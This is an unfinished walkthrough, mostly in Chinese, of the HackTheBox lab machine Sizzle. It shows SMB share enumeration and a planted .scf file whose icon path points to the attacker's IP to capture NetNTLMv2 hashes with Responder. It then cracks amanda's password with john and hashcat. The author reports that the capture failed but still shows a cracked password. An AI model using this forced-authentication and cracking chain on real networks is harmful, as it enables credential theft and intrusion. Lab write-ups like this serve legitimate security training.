Sizzle：10.10.10.103

kali：10.10.16.5

[HTB: Sizzle | 0xdf hacks stuff](https://0xdf.gitlab.io/2019/06/01/htb-sizzle.html#box-info)

[HackTheBox-Sizzle. Hello everyone , in this post I will be… | by ARZ101 | Medium](https://arz101.medium.com/hackthebox-sizzle-bae3ccdee7e1)

# Recon

## nmap

```bash
└─# nmap -sT -p- --min-rate 5555  10.10.10.103
```

```bash
└─# nmap -sC -sV -O -p21,53,80,135,139,443,445,464,593,636,3268,3269,5985,5986,9389,47001 -oN namp.txt 10.10.10.103 

PORT      STATE SERVICE       VERSION
21/tcp    open  ftp           Microsoft ftpd
| ftp-syst: 
|_  SYST: Windows_NT
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Microsoft-IIS/10.0
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
443/tcp   open  ssl/http      Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
| ssl-cert: Subject: commonName=sizzle.htb.local
| Not valid before: 2018-07-03T17:58:55
|_Not valid after:  2020-07-02T17:58:55
|_http-title: Site doesn't have a title (text/html).
| http-methods: 
|_  Potentially risky methods: TRACE
| tls-alpn: 
|   h2
|_  http/1.1
|_ssl-date: 2023-09-20T03:03:49+00:00; -2s from scanner time.
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: HTB.LOCAL, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=sizzle.htb.local
| Not valid before: 2018-07-03T17:58:55
|_Not valid after:  2020-07-02T17:58:55
|_ssl-date: 2023-09-20T03:03:49+00:00; -2s from scanner time.
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: HTB.LOCAL, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=sizzle.htb.local
| Not valid before: 2018-07-03T17:58:55
|_Not valid after:  2020-07-02T17:58:55
|_ssl-date: 2023-09-20T03:03:50+00:00; -1s from scanner time.
3269/tcp  open  ssl/ldap
| ssl-cert: Subject: commonName=sizzle.htb.local
| Not valid before: 2018-07-03T17:58:55
|_Not valid after:  2020-07-02T17:58:55
|_ssl-date: 2023-09-20T03:03:49+00:00; -2s from scanner time.
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
5986/tcp  open  ssl/http      Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_ssl-date: 2023-09-20T03:03:49+00:00; -2s from scanner time.
| ssl-cert: Subject: commonName=sizzle.HTB.LOCAL
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:sizzle.HTB.LOCAL
| Not valid before: 2018-07-02T20:26:23
|_Not valid after:  2019-07-02T20:26:23
| tls-alpn: 
|   h2
|_  http/1.1
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2016 (85%)
OS CPE: cpe:/o:microsoft:windows_server_2016
Aggressive OS guesses: Microsoft Windows Server 2016 (85%)
No exact OS matches for host (test conditions non-ideal).
Service Info: Host: SIZZLE; OS: Windows; CPE: cpe:/o:microsoft:windows
```



## 21 FTP

啥也没有

```bash
└─# ftp 10.10.10.103
Connected to 10.10.10.103.
220 Microsoft FTP Service
Name (10.10.10.103:root): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password: 
230 User logged in.
Remote system type is Windows_NT.
ftp> ls
229 Entering Extended Passive Mode (|||58315|)
125 Data connection already open; Transfer starting.
226 Transfer complete.
ftp> pwd
Remote directory: /
```



## 80 website

<img src=".\图片\Snipaste_2023-09-20_11-03-20.png" alt="Snipaste_2023-09-20_11-03-20" style="zoom:80%;" />

可尝试目录扫描

```bash
gobuster -u http://10.10.10.103/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -x asp,aspx,txt,html 
```

由于是 iis 服务器，可以换个字典试试

```bash
gobuster -k -u https://10.10.10.103 -w /usr/share/seclists/Discovery/Web-Content/IIS.fuzz.txt -t 50

//certenroll/ (Status: 403)
```

也没什么发现



## 389 LDAP

没哟凭据的时候啥也找不到，等到有凭据了再说



## 445 SMB

```bash
└─# smbmap -u xxx  -H 10.10.10.103 
[+] Guest session   	IP: 10.10.10.103:445	Name: 10.10.10.103                                      
        Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	ADMIN$                                            	NO ACCESS	Remote Admin
	C$                                                	NO ACCESS	Default share
	CertEnroll                                        	NO ACCESS	Active Directory Certificate Services share
	Department Shares                                 	READ ONLY	
	IPC$                                              	READ ONLY	Remote IPC
	NETLOGON                                          	NO ACCESS	Logon server share 
	Operations                                        	NO ACCESS	
	SYSVOL                                            	NO ACCESS	Logon server share     
```

```bash
┌──(root💀kali)-[~/Sizzle]
└─# smbclient -N -L \\\\10.10.10.103

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	CertEnroll      Disk      Active Directory Certificate Services share
	Department Shares Disk      
	IPC$            IPC       Remote IPC
	NETLOGON        Disk      Logon server share 
	Operations      Disk      
	SYSVOL          Disk      Logon server share 
```

由于 smbmap 这里无法找到每个目录的权限

接下来就是骚操作了，为了明确每个目录的权限，用循环加过滤整理：

```bash
└─# smbclient -N -L \\\\10.10.10.103 | grep Disk | sed 's/^\s*\(.*\)\s*Disk.*/\1/'
ADMIN$          
C$              
CertEnroll      
Department Shares 
NETLOGON        
Operations      
SYSVOL     
```

```bash
└─# smbclient -N -L \\\\10.10.10.103 | grep Disk | sed 's/^\s*\(.*\)\s*Disk.*/\1/' | while read share; do echo "======${share}======"; smbclient -N "//10.10.10.103/${share}" -c dir; echo; done
```

```bash
======ADMIN$======
tree connect failed: NT_STATUS_ACCESS_DENIED

======C$======
tree connect failed: NT_STATUS_ACCESS_DENIED

======CertEnroll======
NT_STATUS_ACCESS_DENIED listing \*

======Department Shares======
  .                                   D        0  Tue Jul  3 11:22:32 2018
  ..                                  D        0  Tue Jul  3 11:22:32 2018
  Accounting                          D        0  Mon Jul  2 15:21:43 2018
  Audit                               D        0  Mon Jul  2 15:14:28 2018
  Banking                             D        0  Tue Jul  3 11:22:39 2018
  CEO_protected                       D        0  Mon Jul  2 15:15:01 2018
  Devops                              D        0  Mon Jul  2 15:19:33 2018
  Finance                             D        0  Mon Jul  2 15:11:57 2018
  HR                                  D        0  Mon Jul  2 15:16:11 2018
  Infosec                             D        0  Mon Jul  2 15:14:24 2018
  Infrastructure                      D        0  Mon Jul  2 15:13:59 2018
  IT                                  D        0  Mon Jul  2 15:12:04 2018
  Legal                               D        0  Mon Jul  2 15:12:09 2018
  M&A                                 D        0  Mon Jul  2 15:15:25 2018
  Marketing                           D        0  Mon Jul  2 15:14:43 2018
  R&D                                 D        0  Mon Jul  2 15:11:47 2018
  Sales                               D        0  Mon Jul  2 15:14:37 2018
  Security                            D        0  Mon Jul  2 15:21:47 2018
  Tax                                 D        0  Mon Jul  2 15:16:54 2018
  Users                               D        0  Tue Jul 10 17:39:32 2018
  ZZ_ARCHIVE                          D        0  Mon Jul  2 15:32:58 2018

		7779839 blocks of size 4096. 3228990 blocks available

======NETLOGON======
NT_STATUS_ACCESS_DENIED listing \*

======Operations======
NT_STATUS_ACCESS_DENIED listing \*

======SYSVOL======
NT_STATUS_ACCESS_DENIED listing \*
```

得到  `Department Shares `  目录我们可以进入，这里为了方便操作，直接把共享目录挂载到本地

```bash
└─# mount -t cifs "//10.10.10.103/Department Shares" /mnt
Password for root@//10.10.10.103/Department Shares: 
└─# cd /mnt/   
└─# ls               
 Accounting   Banking         Devops    HR        Infrastructure   Legal   Marketing   Sales      Tax     ZZ_ARCHIVE
 Audit        CEO_protected   Finance   Infosec   IT              'M&A'   'R&D'        Security   Users
```

查看 users 目录

```bash
┌──(root💀kali)-[/mnt/users]
└─# ls
amanda  amanda_adm  bill  bob  chris  henry  joe  jose  lkys37en  morgan  mrb3n  Public
```

看到一些用户名，要留心把它们整理成字典

接下来可以检查下 /mnt/ 目录下或文件的写权限，依旧是 bash脚本编程完成：

```bash
└─# find . -type d | while read directory; do touch ${directory}/0xdf 2>/dev/null && echo "${directory} - write file" && rm ${directory}/0xdf; mkdir ${directory}/0xdf 2>/dev/null && echo "${directory} - write directory" && rmdir ${directory}/0xdf; done

./Users/Public - write file
./Users/Public - write directory
./ZZ_ARCHIVE - write file
./ZZ_ARCHIVE - write directory
```

接下来我们可以在可写目录创建点新文件，但是过一段时间，这些新文件就被自动删除了

```bash
└─# touch {/mnt/ZZ_ARCHIVE/,./}0xdf.{lnk,exe,dll,ini}                                                                                                                                                                                                                       
┌──(root💀kali)-[/mnt/users/public]
└─# ls
0xdf.dll  0xdf.exe  0xdf.exetouch  0xdf.ini  0xdf.lnk  0xdf.lnktouch
```

监控新创建的文件

```bash
watch -d "ls /mnt/Users/Public/*; ls /mnt/ZZ_ARCHIVE/0xdf*"
```

<img src=".\图片\Snipaste_2023-09-20_11-42-02.png" alt="Snipaste_2023-09-20_11-42-02" style="zoom:67%;" />

`/mnt/users/public` 里下新创建的文件过一会儿被自动删除了

取消挂载命令

```bash
└─# umount /mnt/
```



# Creds for Amanda

## Strategy

Now that I know there’s some kind of user interaction on this host, a bunch more ideas for attack vectors come to mind. [This paper](http://www.defensecode.com/whitepapers/Stealing-Windows-Credentials-Using-Google-Chrome.pdf) outlines how Windows Explorer Shell Command files (`.scf`) can be used to get Windows to open an SMB connection whenever a user visits a directory containing the file. A `.scf` is a text file that can include an icon path that can be remote. `.lnk` files used to have the same issue, but this was [patched in August 2010](https://docs.microsoft.com/en-us/security-updates/SecurityBulletins/2010/ms10-046) after Stuxnet was seen in the wild abusing `.lnk` files

For Sizzle, I will drop a `.scf` file with a link location on my host, and use responder to capture the NTLMv2 hash. For more information on responder and NetNTLMv2, check out [my post on responder](https://0xdf.gitlab.io/2019/01/13/getting-net-ntlm-hases-from-windows.html), which was released just around the time Sizzle was released (though I hadn’t done Sizzle yet). Here’s [another reference](https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/) for methods to capture NetNTLMv2, which includes `.scf` files.

大概意思就是，当有用户查看 `.scf` 文件所在的目录或者做了什么事情时，`.csf` 文件里的 `icon` 路径会被远程执行。以上定时删除文件的这个特性刚好满足了我们攻击的条件，可配合 `Responder`

## Get NetNTLMv2

```bash
root@kali:/mnt/Users/Public# cat 0xdf.scf 
[Shell]
Command=2
IconFile=\\10.10.16.5\uwu\uwu.ico
[Taskbar]
Command=ToggleDesktop
```

配合 Responder 

```
└─# responder -I tun0 --lm
```

失败了，根本接受不到，不知道原因



## Crack NetNTLMv2

```bash
└─# john --wordlist=/usr/share/wordlists/rockyou.txt amanda-ntlmv2 
```

```bash
hashcat -m 5600 amanda-ntlmv2 /usr/share/wordlists/rockyou.txt --force
```

得到凭据：

```
Ashare1972       (amanda)     
```



# Enumeration as amanda

## Shell over WinRM - Fail

失败，无法 winrm 远程登录



## Share Access

```bash
└─# smbmap -H 10.10.10.103 -u amanda -p Ashare1972
[+] IP: 10.10.10.103:445	Name: 10.10.10.103                                      
        Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	ADMIN$                                            	NO ACCESS	Remote Admin
	C$                                                	NO ACCESS	Default share
	CertEnroll                                        	READ ONLY	Active Directory Certificate Services share
	Department Shares                                 	READ ONLY	
	IPC$                                              	READ ONLY	Remote IPC
	NETLOGON                                          	READ ONLY	Logon server share 
	Operations                                        	NO ACCESS	
	SYSVOL                                            	READ ONLY	Logon server share 
```



## LDAP

```bash
└─# ldapdomaindump -u 'htb.local\amanda' -p Ashare1972 10.10.10.103 -o ldap/                                 
[*] Connecting to host...
[*] Binding to host
[+] Bind OK
[*] Starting domain dump
[+] Domain dump finished
```

```bash
┌──(root💀kali)-[~/Sizzle/ldap]
└─# ls
domain_computers_by_os.html  domain_computers.json  domain_groups.json  domain_policy.json  domain_trusts.json          domain_users.html
domain_computers.grep        domain_groups.grep     domain_policy.grep  domain_trusts.grep  domain_users_by_group.html  domain_users.json
domain_computers.html        domain_groups.html     domain_policy.html  domain_trusts.html  domain_users.grep
```

<img src=".\图片\Snipaste_2023-09-20_13-14-35.png" alt="Snipaste_2023-09-20_13-14-35" style="zoom:80%;" />



# Shell as amanda

## Accessing /certsrv

有个 web 目录 `/certsrv` 之前 gobuster 没找到它，因为规则没加 401，以下则可以找到这个目录

```bash
gobuster -k -u https://10.10.10.103 -w /usr/share/seclists/Discovery/Web-Content/IIS.fuzz.txt -t 20 -s 200,204,301,302,307,403,401
```

一个登录框

<img src=".\图片\Snipaste_2023-09-20_13-18-05.png" alt="Snipaste_2023-09-20_13-18-05" style="zoom:80%;" />

用之前得到的凭据 `amanda:Ashare1972` 登录试试

<img src=".\图片\Snipaste_2023-09-20_13-20-55.png" alt="Snipaste_2023-09-20_13-20-55" style="zoom:80%;" />

登录后是一个类似证书什么的

## Generate Certificate and Key for amanda
